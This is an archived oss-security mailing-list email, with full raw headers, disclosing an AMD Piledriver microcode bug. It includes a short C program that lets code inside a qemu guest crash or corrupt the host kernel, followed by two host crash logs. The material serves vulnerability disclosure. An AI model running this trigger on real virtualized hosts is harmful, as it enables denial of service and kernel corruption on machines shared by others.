X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["6959" "Tuesday" "14" "June" "2016" "06:24:13" "+0200" "=?UTF-8?B?Um9iZXJ0IMWad2nEmWNraQ==?=" "robert@swiecki.net" "<CAP145pj-o1OWavaVAD7-qmiWUYx9HrE01wL5aTGurJ0DrRj=eA@mail.gmail.com>" "153" "[oss-security] Re: AMD newest ucode 0x06000832 for Piledriver-based CPUs seems to behave in a problematic way" nil nil nil "6" "2016061404:24:13" "[oss-security] Re: AMD newest ucode 0x06000832 for Piledriver-based CPUs seems to behave in a problematic way" (number mark "U       robert@swiec Jun 14  153/6959  " thread-indent "\"[oss-security] Re: AMD newest ucode 0x06000832 for Piledriver-based CPUs seems to behave in a problematic way\"\n") "<CAP145piPtZJb=PqZT6-JJudkfryeyU4YM03D4uFFEDa5rUFF5A@mail.gmail.com>" ("<CAP145pjL_=W0C_3NvHxkJ2girfx3wS-7i-epRxwcmDmd7J3E1Q@mail.gmail.com>" "<CAP145piPtZJb=PqZT6-JJudkfryeyU4YM03D4uFFEDa5rUFF5A@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 4039 invoked by uid 550); 14 Jun 2016 04:24:31 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 3989 invoked from network); 14 Jun 2016 04:24:26 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=swiecki.net; s=google;
        h=mime-version:in-reply-to:references:from:date:message-id:subject:to
         :content-transfer-encoding;
        bh=7Yv9U9EhRMcfe/WEGgirNP5GgG282QYsy7NGodVxlNo=;
        b=X+T5Dc4lZJfJJ6EYInWLjSNVNe+V1LRJ36d77a1jz/Vb3xcZu+aouU4B/14ncOVXDd
         BFZpWqjAJyA5ihQYlkIe5dWKNVc88Yvrn5MQD9F3B5X30EukEt9Nioc1vRcKHrAr6cVW
         Kb3NVW1VlzHsJ43wyPrv/UJ7oFdvFg4P2J/tg=
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:in-reply-to:references:from:date
         :message-id:subject:to:content-transfer-encoding;
        bh=7Yv9U9EhRMcfe/WEGgirNP5GgG282QYsy7NGodVxlNo=;
        b=YJzET+r5OdmmmDfbiTZht9hP0sIvVCvp0Q9uQtJ/xKBAm6xfbSmZSXqDWJ/95jjBNC
         1Yk/dZ/4fZ7sJoZJ0c2xLISpFV04ElrvV/OjVJsS/LqTKrlDT49mPAuwzBKmPZZE2yzc
         V3e/K4cwE4llQEtVkzIolvwLEM7P9DhSDveprUgnqPijS2IVgcqOkCZKFMh6EhI0DYVA
         IARtv0Tkk2TTn+wjhe1+hcNlXGS0L/ulUBgNkuD+neURztRrjtzqadSHgUT1GSlzAGr3
         jJDOIvCrzNUQ4QDiJLp9fE/wKgTk8fNeUAFbswZAKE2To6YYWtCLD1lx77+zdnW44Ht7
         k3dw==
X-Gm-Message-State: ALyK8tL2gb3mSIzGjZC6tkQmjGOyWE8Y0iJN4UvLCVJHXg7w+O4fyqQ0VXl/DVTKOmWZjZ/2ocbVHTOaDOcCHQ==
X-Received: by 10.55.174.198 with SMTP id x189mr9861907qke.71.1465878254293;
 Mon, 13 Jun 2016 21:24:14 -0700 (PDT)
MIME-Version: 1.0
In-Reply-To: <CAP145piPtZJb=PqZT6-JJudkfryeyU4YM03D4uFFEDa5rUFF5A@mail.gmail.com>
References: <CAP145pjL_=W0C_3NvHxkJ2girfx3wS-7i-epRxwcmDmd7J3E1Q@mail.gmail.com>
 <CAP145piPtZJb=PqZT6-JJudkfryeyU4YM03D4uFFEDa5rUFF5A@mail.gmail.com>
From: =?UTF-8?B?Um9iZXJ0IMWad2nEmWNraQ==?= <robert@swiecki.net>
Date: Tue, 14 Jun 2016 06:24:13 +0200
Message-ID: <CAP145pj-o1OWavaVAD7-qmiWUYx9HrE01wL5aTGurJ0DrRj=eA@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable
Subject: [oss-security] Re: AMD newest ucode 0x06000832 for Piledriver-based CPUs seems to
 behave in a problematic way

> > AMD newest public ucode 0x06000832 for Piledriver-based CPUs (newer
> > AMD FX, and Opteron 3300/4300/6300 series) seems to be broken. Under
> > certain conditions it allows unprivileged users running under qemu VMs
> > to affect the host Linux kernel in a problematic manner: the CPU
> > starts to behave in an erratic way, and it leads to CPU execution flow
> > of the host kernel (the one running on bare metal) to be changed.
>
> It seems that AMD (somewhat silently) released - in
> https://lkml.org/lkml/2016/3/17/43 - a new microcode for 15th family
> of AMD CPUs.

AMD has updated their microcode some time ago, therefore here's some
more data on this bug, and code that triggers it.

On the guest system:
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
#include <unistd.h>
#include <sys/syscall.h>
#include <string.h>
#include <stdint.h>
#include <linux/perf_event.h>

int main (void)
{
  int i;

 // increasing i from 2 to 3-10 makes it easier
 // to trigger Oops in the host kernel
  for (i =3D 0; i < 2; i++)
  {
    struct perf_event_attr attr;
    memset(&attr, 0, sizeof attr);
    attr.type =3D PERF_TYPE_HARDWARE;
    attr.size =3D sizeof attr;
    attr.config =3D PERF_COUNT_HW_CACHE_MISSES;
    attr.sample_period =3D 32;
    syscall(__NR_perf_event_open, &attr, 0, 0, -1, 0, 0);
  }
}
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

And typical crashes in the host kernel:

Stack-protector failure (stack corruption)
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
<0>[ 8685.963905] Kernel panic - not syncing: stack-protector: Kernel
stack is corrupted in: ffffffffc04e97dc
<0>[ 8685.963905]
<4>[ 8685.965386] CPU: 1 PID: 6600 Comm: qemu-system-x86 Not tainted
4.4.0-5-generic #20-Ubuntu
<4>[ 8685.966455] Hardware name: To be filled by O.E.M. To be filled
by O.E.M./Crosshair V Formula, BIOS 1703 10/17/2012
<4>[ 8685.967857]  0000000000000000 00000000d760d174 ffff8804020e3c98
ffffffff813da514
<4>[ 8685.968834]  ffffffff81cae730 ffff8804020e3d20 ffffffff81187752
0000000000000010
<4>[ 8685.969840]  ffff8804020e3d30 ffff8804020e3cc8 00000000d760d174
ffff8804020e3d30
<4>[ 8685.970839] Call Trace:
<4>[ 8685.971165]  [<ffffffff813da514>] dump_stack+0x44/0x60
<4>[ 8685.971864]  [<ffffffff81187752>] panic+0xd3/0x21a
<4>[ 8685.972508]  [<ffffffffc04e97dc>] ? vcpu_enter_guest+0xffc/0x1000 [kv=
m]
<4>[ 8685.973396]  [<ffffffff8107ea09>] __stack_chk_fail+0x19/0x20
<4>[ 8685.974177]  [<ffffffffc04e97dc>] vcpu_enter_guest+0xffc/0x1000 [kvm]
<4>[ 8685.975030]  [<ffffffffc04e9176>] vcpu_enter_guest+0x996/0x1000 [kvm]
<4>[ 8685.975903]  [<ffffffff8108bae1>] ? __set_task_blocked+0x41/0xa0
<4>[ 8685.976719]  [<ffffffff8108e426>] ? __set_current_blocked+0x36/0x60
<4>[ 8685.977571]  [<ffffffffc04ef62f>] kvm_arch_vcpu_ioctl_run+0xdf/0x400 =
[kvm]
<4>[ 8685.978479]  [<ffffffffc04d703d>] kvm_vcpu_ioctl+0x33d/0x5f0 [kvm]
<4>[ 8685.979319]  [<ffffffff810ff473>] ? do_futex+0xd3/0x500
<4>[ 8685.980024]  [<ffffffff8121b158>] do_vfs_ioctl+0x298/0x480
<4>[ 8685.980754]  [<ffffffffc0500f00>] ? check_perm_out+0x50/0x50 [kvm]
<4>[ 8685.981595]  [<ffffffffc04d1070>] ? kvm_vcpu_mmap+0x20/0x20 [kvm]
<4>[ 8685.982418]  [<ffffffff8121b3b9>] SyS_ioctl+0x79/0x90
<4>[ 8685.983081]  [<ffffffff818126f2>] entry_SYSCALL_64_fastpath+0x16/0x71
<4>[ 8685.983949]  [<ffffffff818126c7>] ?
entry_SYSCALL_64_after_swapgs+0x34/0x49
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D


Invalid EIP
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
[  582.367744] BUG: unable to handle kernel paging request at ffff8807fbf2c=
040
[  582.367852] IP: [<ffff8807fbf2c040>] 0xffff8807fbf2c040
[  582.367929] PGD 1d39067 PUD 7fbb58063 PMD 80000007fbe001e3
[  582.368071] Oops: 0011 [#1] SMP
[  582.368175] Modules linked in: kvm_amd kvm.....
[  582.370970] CPU: 4 PID: 2427 Comm: qemu-system-x86 Not tainted
4.3.0-0.bpo.1-amd64 #1 Debian 4.3.3-7~bpo8+1
[  582.371018] Hardware name: MICRO-STAR INTERNATIONAL CO.,LTD
MS-7596/760GM-E51(MS-7596), BIOS V3.6 10/26/2012
[  582.371064] task: ffff8807f7cc2240 ti: ffff8807fa688000 task.ti:
ffff8807fa688000
[  582.371109] RIP: 0010:[<ffff8807fbf2c040>]  [<ffff8807fbf2c040>]
0xffff8807fbf2c040
[  582.371189] RSP: 0018:ffff8807fa68be08  EFLAGS: 00010246
[  582.371237] RAX: 0000000000000000 RBX: ffffffffa048b15c RCX: 00000000000=
00176
[  582.371280] RDX: 0000000000000000 RSI: 000000008158c9a0 RDI: 00000000000=
00176
[  582.371322] RBP: ffff8807fbf2c040 R08: ffffffffa06ac050 R09: 00000000000=
00000
[  582.371364] R10: 00000000296c6c75 R11: ffffffff825d1e3c R12: 00000000000=
00000
[  582.371406] R13: 0000000000000002 R14: 0000000000000000 R15: 00000000000=
00000
[  582.371451] FS:  00007f9966b5f700(0000) GS:ffff8807ff680000(0000)
knlGS:0000000000000000
[  582.371497] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b
[  582.371541] CR2: ffff8807fbf2c040 CR3: 00000007f7fb5000 CR4: 00000000000=
406e0
[  582.371585] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 00000000000=
00000
[  582.371628] DR3: 0000000000000000 DR6: 00000000ffff4ff0 DR7: 00000000000=
00400
[  582.371669] Stack:
[  582.371709]  ffffffffa06c5cb3 ffff8807fbf2c040 ffffffffa06b151e
0000000000000000
[  582.371890]  ffffffffa06b1655 ffffffff8118f9bd ffff8807f7fc1c80
ffff880700000000
[  582.372068]  ffffea00030e9600 00000000c3a58962 0000000266b5eb90
00005641b00d02c0
[  582.372247] Call Trace:
[  582.372324]  [<ffffffffa06c5cb3>] ? kvm_arch_vcpu_put+0x13/0x30 [kvm]
[  582.372390]  [<ffffffffa06b151e>] ? vcpu_put+0xe/0x30 [kvm]
[  582.372454]  [<ffffffffa06b1655>] ? kvm_vcpu_ioctl+0x115/0x5a0 [kvm]
[  582.372503]  [<ffffffff8118f9bd>] ? handle_mm_fault+0xb3d/0x16c0
[  582.372551]  [<ffffffff811e3255>] ? do_vfs_ioctl+0x2d5/0x4b0
[  582.372597]  [<ffffffff810ec1a3>] ? SyS_futex+0x83/0x180
[  582.372644]  [<ffffffff811e34a6>] ? SyS_ioctl+0x76/0x90
[  582.372690]  [<ffffffff8158a3f6>] ? system_call_fast_compare_end+0xc/0x6b
[  582.372733] Code: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 <00> 00 91 f8 07 88 ff ff 00 00 00 00 00 00 00 00 48 24 cc
f7 07
[  582.374992] RIP  [<ffff8807fbf2c040>] 0xffff8807fbf2c040
[  582.375065]  RSP <ffff8807fa68be08>
[  582.375106] CR2: ffff8807fbf2c040
[  582.375146] ---[ end trace 73c9b508504cc249 ]---
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D


--=20
Robert =C5=9Awi=C4=99cki
